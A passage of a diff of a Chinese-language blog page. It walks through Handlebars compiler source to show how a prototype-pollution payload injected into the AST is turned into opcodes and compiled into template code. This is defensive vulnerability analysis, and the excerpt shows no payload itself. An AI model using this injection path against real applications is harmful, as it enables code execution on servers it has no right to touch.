class="property">blockParams</span> || [];</span><br><span class="line"></span><br><span class="line">    options.<span class="property">knownHelpers</span> = _utils.<span class="title function_">extend</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), &#123;</span><br><span class="line">      <span class="attr">helperMissing</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">blockHelperMissing</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">each</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&#x27;if&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">unless</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&#x27;with&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">lookup</span>: <span class="literal">true</span></span><br><span class="line">    &#125;, options.<span class="property">knownHelpers</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">accept</span>(program); <span class="comment">// 传入accept函数进行处理</span></span><br><span class="line">  &#125;,</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
 
-    if (this.current) &#123;
-      this.parents.unshift(this.current);
-    &#125;
-    this.current = object;
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">node</span>) &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[node.<span class="property">type</span>]) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + node.<span class="property">type</span>, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">unshift</span>(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[node.<span class="property">type</span>](node); <span class="comment">// 提取AST对应的type并调用该构造函数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-    var ret = this[object.type](object); // 调用对应的构造函数解析AST
-
-    this.current = this.parents.shift();
-
-    if (!this.mutating || ret) &#123;
-      return ret;
-    &#125; else if (ret !== false) &#123;
-      return object;
-    &#125;
-  &#125;,</code></pre>
-<h4 id="编译环境变量"><a href="#编译环境变量" class="headerlink" title="编译环境变量"></a>编译环境变量</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
-
-  function compileInput() &#123;
-    var ast = env.parse(input, options), 
-        environment = new env.Compiler().compile(ast, options), // 编译环境变量
-        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true);
-    return env.template(templateSpec);
-  &#125;</code></pre>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
-
-  compile: function compile(program, options) &#123;
-    this.sourceNode = [];
-    this.opcodes = [];
-    this.children = [];
-    this.options = options;
-    this.stringParams = options.stringParams;
-    this.trackIds = options.trackIds;
-
-    options.blockParams = options.blockParams || [];
-
-    options.knownHelpers = _utils.extend(Object.create(null), &#123;
-      helperMissing: true,
-      blockHelperMissing: true,
-      each: true,
-      &#39;if&#39;: true,
-      unless: true,
-      &#39;with&#39;: true,
-      log: true,
-      lookup: true
-    &#125;, options.knownHelpers);
-
-    return this.accept(program); // 传入accept函数进行处理
-  &#125;,
-</code></pre>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
-
-  accept: function accept(node) &#123;
-    /* istanbul ignore next: Sanity code */
-    if (!this[node.type]) &#123;
-      throw new _exception2[&#39;default&#39;](&#39;Unknown type: &#39; + node.type, node);
-    &#125;
-
-    this.sourceNode.unshift(node);
-    var ret = this[node.type](node); // 提取AST对应的type并调用该构造函数
-    this.sourceNode.shift();
-    return ret;
-  &#125;,</code></pre>
 <p>第一次<code>node.type</code>被污染为<code>program</code></p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">Program</span>: <span class="keyword">function</span> <span class="title function_">Program</span>(<span class="params">program</span>) &#123; <span class="comment">// 利用Program类来自定义类</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">unshift</span>(program.<span class="property">blockParams</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> body = program.<span class="property">body</span>, <span class="comment">// 通过污染body插入我们的恶意代码</span></span><br><span class="line">        bodyLength = body.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bodyLength; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(body[i]); <span class="comment">// 提取我们的body继续调用accept进行解析</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isSimple</span> = bodyLength === <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = program.<span class="property">blockParams</span> ? program.<span class="property">blockParams</span>.<span class="property">length</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  Program: function Program(program) &#123; // 利用Program类来自定义类
-    this.options.blockParams.unshift(program.blockParams);
-
-    var body = program.body, // 通过污染body插入我们的恶意代码
-        bodyLength = body.length;
-    for (var i = 0; i &lt; bodyLength; i++) &#123;
-      this.accept(body[i]); // 提取我们的body继续调用accept进行解析
-    &#125;
-
-    this.options.blockParams.shift();
-
-    this.isSimple = bodyLength === 1;
-    this.blockParams = program.blockParams ? program.blockParams.length : 0;
-
-    return this;
-  &#125;,</code></pre>
 <p>第二次<code>node.type</code>为自定义的<code>MustacheStatement</code></p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">MustacheStatement</span>: <span class="keyword">function</span> <span class="title function_">MustacheStatement</span>(<span class="params">mustache</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title class_">SubExpression</span>(mustache); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mustache.<span class="property">escaped</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">noEscape</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;appendEscaped&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;append&#x27;</span>); <span class="comment">// 如果没有设置escaped的话就进行append操作</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="title class_">SubExpression</span>: <span class="keyword">function</span> <span class="title function_">SubExpression</span>(<span class="params">sexpr</span>) &#123;</span><br><span class="line">    <span class="title function_">transformLiteralToPath</span>(sexpr);</span><br><span class="line">    <span class="keyword">var</span> type = <span class="variable language_">this</span>.<span class="title function_">classifySexpr</span>(sexpr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type === <span class="string">&#x27;simple&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">simpleSexpr</span>(sexpr);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">&#x27;helper&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">helperSexpr</span>(sexpr); <span class="comment">// 2</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">ambiguousSexpr</span>(sexpr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">helperSexpr</span>: <span class="keyword">function</span> <span class="title function_">helperSexpr</span>(<span class="params">sexpr, program, inverse</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> params = <span class="variable language_">this</span>.<span class="title function_">setupFullMustacheParams</span>(sexpr, program, inverse), <span class="comment">// 3</span></span><br><span class="line">        path = sexpr.<span class="property">path</span>,</span><br><span class="line">        name = path.<span class="property">parts</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">knownHelpers</span>[name]) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;invokeKnownHelper&#x27;</span>, params.<span class="property">length</span>, name);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">knownHelpersOnly</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;You specified knownHelpersOnly, but used the unknown helper &#x27;</span> + name, sexpr);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      path.<span class="property">strict</span> = <span class="literal">true</span>;</span><br><span class="line">      path.<span class="property">falsy</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(path);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;invokeHelper&#x27;</span>, params.<span class="property">length</span>, path.<span class="property">original</span>, _ast2[<span class="string">&#x27;default&#x27;</span>].<span class="property">helpers</span>.<span class="title function_">simpleId</span>(path));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">setupFullMustacheParams</span>: <span class="keyword">function</span> <span class="title function_">setupFullMustacheParams</span>(<span class="params">sexpr, program, inverse, omitEmpty</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> params = sexpr.<span class="property">params</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pushParams</span>(params); <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushProgram&#x27;</span>, program);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushProgram&#x27;</span>, inverse);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sexpr.<span class="property">hash</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(sexpr.<span class="property">hash</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;emptyHash&#x27;</span>, omitEmpty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> params;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">pushParams</span>: <span class="keyword">function</span> <span class="title function_">pushParams</span>(<span class="params">params</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = params.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">pushParam</span>(params[i]); <span class="comment">// 5</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">pushParam</span>: <span class="keyword">function</span> <span class="title function_">pushParam</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> value = val.<span class="property">value</span> != <span class="literal">null</span> ? val.<span class="property">value</span> : val.<span class="property">original</span> || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">stringParams</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (value.<span class="property">replace</span>) &#123;</span><br><span class="line">        value = value.<span class="title function_">replace</span>(<span class="regexp">/^(\.?\.\/)*/g</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (val.<span class="property">depth</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">addDepth</span>(val.<span class="property">depth</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;getContext&#x27;</span>, val.<span class="property">depth</span> || <span class="number">0</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushStringParam&#x27;</span>, value, val.<span class="property">type</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (val.<span class="property">type</span> === <span class="string">&#x27;SubExpression&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// SubExpressions get evaluated and passed in</span></span><br><span class="line">        <span class="comment">// in string params mode.</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">accept</span>(val);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">trackIds</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> blockParamIndex = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">if</span> (val.<span class="property">parts</span> &amp;&amp; !_ast2[<span class="string">&#x27;default&#x27;</span>].<span class="property">helpers</span>.<span class="title function_">scopedId</span>(val) &amp;&amp; !val.<span class="property">depth</span>) &#123;</span><br><span class="line">          blockParamIndex = <span class="variable language_">this</span>.<span class="title function_">blockParamIndex</span>(val.<span class="property">parts</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (blockParamIndex) &#123;</span><br><span class="line">          <span class="keyword">var</span> blockParamChild = val.<span class="property">parts</span>.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushId&#x27;</span>, <span class="string">&#x27;BlockParam&#x27;</span>, blockParamIndex, blockParamChild);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          value = val.<span class="property">original</span> || value;</span><br><span class="line">          <span class="keyword">if</span> (value.<span class="property">replace</span>) &#123;</span><br><span class="line">            value = value.<span class="title function_">replace</span>(<span class="regexp">/^this(?:\.|$)/</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/^\.\//</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/^\.$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushId&#x27;</span>, val.<span class="property">type</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(val); <span class="comment">// 6 很巧妙地将我们的payload再次传入accept函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  MustacheStatement: function MustacheStatement(mustache) &#123;
-    this.SubExpression(mustache); // 1
-
-    if (mustache.escaped &amp;&amp; !this.options.noEscape) &#123;
-      this.opcode(&#39;appendEscaped&#39;);
-    &#125; else &#123;
-      this.opcode(&#39;append&#39;); // 如果没有设置escaped的话就进行append操作
-    &#125;
-  &#125;,
-
-  SubExpression: function SubExpression(sexpr) &#123;
-    transformLiteralToPath(sexpr);
-    var type = this.classifySexpr(sexpr);
-
-    if (type === &#39;simple&#39;) &#123;
-      this.simpleSexpr(sexpr);
-    &#125; else if (type === &#39;helper&#39;) &#123;
-      this.helperSexpr(sexpr); // 2
-    &#125; else &#123;
-      this.ambiguousSexpr(sexpr);
-    &#125;
-  &#125;,
-
-  helperSexpr: function helperSexpr(sexpr, program, inverse) &#123;
-    var params = this.setupFullMustacheParams(sexpr, program, inverse), // 3
-        path = sexpr.path,
-        name = path.parts[0];
-
-    if (this.options.knownHelpers[name]) &#123;
-      this.opcode(&#39;invokeKnownHelper&#39;, params.length, name);
-    &#125; else if (this.options.knownHelpersOnly) &#123;
-      throw new _exception2[&#39;default&#39;](&#39;You specified knownHelpersOnly, but used the unknown helper &#39; + name, sexpr);
-    &#125; else &#123;
-      path.strict = true;
-      path.falsy = true;
-
-      this.accept(path);
-      this.opcode(&#39;invokeHelper&#39;, params.length, path.original, _ast2[&#39;default&#39;].helpers.simpleId(path));
-    &#125;
-  &#125;,
-
-  setupFullMustacheParams: function setupFullMustacheParams(sexpr, program, inverse, omitEmpty) &#123;
-    var params = sexpr.params;
-    this.pushParams(params); // 4
-
-    this.opcode(&#39;pushProgram&#39;, program);
-    this.opcode(&#39;pushProgram&#39;, inverse);
-
-    if (sexpr.hash) &#123;
-      this.accept(sexpr.hash);
-    &#125; else &#123;
-      this.opcode(&#39;emptyHash&#39;, omitEmpty);
-    &#125;
-
-    return params;
-  &#125;,
-
-  pushParams: function pushParams(params) &#123;
-    for (var i = 0, l = params.length; i &lt; l; i++) &#123;
-      this.pushParam(params[i]); // 5
-    &#125;
-  &#125;,
-
-  pushParam: function pushParam(val) &#123;
-    var value = val.value != null ? val.value : val.original || &#39;&#39;;
-
-    if (this.stringParams) &#123;
-      if (value.replace) &#123;
-        value = value.replace(/^(\.?\.\/)*/g, &#39;&#39;).replace(/\//g, &#39;.&#39;);
-      &#125;
-
-      if (val.depth) &#123;
-        this.addDepth(val.depth);
-      &#125;
-      this.opcode(&#39;getContext&#39;, val.depth || 0);
-      this.opcode(&#39;pushStringParam&#39;, value, val.type);
-
-      if (val.type === &#39;SubExpression&#39;) &#123;
-        // SubExpressions get evaluated and passed in
-        // in string params mode.
-        this.accept(val);
-      &#125;
-    &#125; else &#123;
-      if (this.trackIds) &#123;
-        var blockParamIndex = undefined;
-        if (val.parts &amp;&amp; !_ast2[&#39;default&#39;].helpers.scopedId(val) &amp;&amp; !val.depth) &#123;
-          blockParamIndex = this.blockParamIndex(val.parts[0]);
-        &#125;
-        if (blockParamIndex) &#123;
-          var blockParamChild = val.parts.slice(1).join(&#39;.&#39;);
-          this.opcode(&#39;pushId&#39;, &#39;BlockParam&#39;, blockParamIndex, blockParamChild);
-        &#125; else &#123;
-          value = val.original || value;
-          if (value.replace) &#123;
-            value = value.replace(/^this(?:\.|$)/, &#39;&#39;).replace(/^\.\//, &#39;&#39;).replace(/^\.$/, &#39;&#39;);
-          &#125;
-
-          this.opcode(&#39;pushId&#39;, val.type, value);
-        &#125;
-      &#125;
-      this.accept(val); // 6 很巧妙地将我们的payload再次传入accept函数
-    &#125;
-  &#125;,</code></pre>
 <p>第三次<code>node.type</code>为<code>NumberLiteral</code></p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">StringLiteral</span>: <span class="keyword">function</span> <span class="title function_">StringLiteral</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushString&#x27;</span>, string.<span class="property">value</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">NumberLiteral</span>: <span class="keyword">function</span> <span class="title function_">NumberLiteral</span>(<span class="params">number</span>) &#123; </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, number.<span class="property">value</span>); <span class="comment">// 将我们的payload识别为Literal而直接转进构造函数</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">BooleanLiteral</span>: <span class="keyword">function</span> <span class="title function_">BooleanLiteral</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, bool.<span class="property">value</span>); </span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">UndefinedLiteral</span>: <span class="keyword">function</span> <span class="title function_">UndefinedLiteral</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  StringLiteral: function StringLiteral(string) &#123;
-    this.opcode(&#39;pushString&#39;, string.value);
-  &#125;,
-
-  NumberLiteral: function NumberLiteral(number) &#123; 
-    this.opcode(&#39;pushLiteral&#39;, number.value); // 将我们的payload识别为Literal而直接转进构造函数
-  &#125;,
-
-  BooleanLiteral: function BooleanLiteral(bool) &#123;
-    this.opcode(&#39;pushLiteral&#39;, bool.value); 
-  &#125;,
-
-  UndefinedLiteral: function UndefinedLiteral() &#123;
-    this.opcode(&#39;pushLiteral&#39;, &#39;undefined&#39;);
-  &#125;,</code></pre>
 <p>后面还有一系列对<code>opcode</code>的操作，均为<code>MustacheStatement</code>语法树的编译过程，下图是编译好<code>MustacheStatement</code>语法树之后<code>opcodes</code>的全部操作，而我们的payload就被注入了第一个</p>
 <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021092516367021e78643cf9a68f7c7.png" alt="image-20210925113821867" style="zoom:80%;" />
 
-<h4 id="编译模板"><a href="#编译模板" class="headerlink" title="编译模板"></a>编译模板</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
+<h4 id="编译模板"><a href="#编译模板" class="headerlink" title="编译模板"></a>编译模板</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), </span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options),</span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>); <span class="comment">// 将我们的环境变量传进去来编译templateSpec</span></span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-  function compileInput() &#123;
-    var ast = env.parse(input, options), 
-        environment = new env.Compiler().compile(ast, options),
-        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true); // 将我们的环境变量传进去来编译templateSpec
-    return env.template(templateSpec);
-  &#125;</code></pre>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">compile</span>: <span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">environment, options, context, asObject</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">environment</span> = environment;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stringParams</span> = <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">stringParams</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">trackIds</span> = <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">trackIds</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">precompile</span> = !asObject;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">name</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isChild</span> = !!context;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">context</span> = context || &#123;</span><br><span class="line">      <span class="attr">decorators</span>: [],</span><br><span class="line">      <span class="attr">programs</span>: [],</span><br><span class="line">      <span class="attr">environments</span>: []</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">preamble</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stackSlot</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stackVars</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">aliases</span> = &#123;&#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">registers</span> = &#123; <span class="attr">list</span>: [] &#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">hashes</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">compileStack</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">inlineStack</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">compileChildren</span>(environment, options);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">useDepths</span> = <span class="variable language_">this</span>.<span class="property">useDepths</span> || environment.<span class="property">useDepths</span> || environment.<span class="property">useDecorators</span> || <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compat</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">useBlockParams</span> = <span class="variable language_">this</span>.<span class="property">useBlockParams</span> || environment.<span class="property">useBlockParams</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> opcodes = environment.<span class="property">opcodes</span>,</span><br><span class="line">        opcode = <span class="literal">undefined</span>,</span><br><span class="line">        firstLoc = <span class="literal">undefined</span>,</span><br><span class="line">        i = <span class="literal">undefined</span>,</span><br><span class="line">        l = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, l = opcodes.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">      opcode = opcodes[i];</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span> = opcode.<span class="property">loc</span>;</span><br><span class="line">      firstLoc = firstLoc || opcode.<span class="property">loc</span>;</span><br><span class="line">      <span class="variable language_">this</span>[opcode.<span class="property">opcode</span>].<span class="title function_">apply</span>(<span class="variable language_">this</span>, opcode.<span class="property">args</span>); <span class="comment">// 这里就是使用我们opcode的操作，然后会把结果存到this.source.SourceNode中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flush any trailing content that might be pending.</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span> = firstLoc;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pushSource</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">stackSlot</span> || <span class="variable language_">this</span>.<span class="property">inlineStack</span>.<span class="property">length</span> || <span class="variable language_">this</span>.<span class="property">compileStack</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Compile completed with content left on stack&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">useDecorators</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">prepend</span>([<span class="string">&#x27;var decorators = container.decorators, &#x27;</span>, <span class="variable 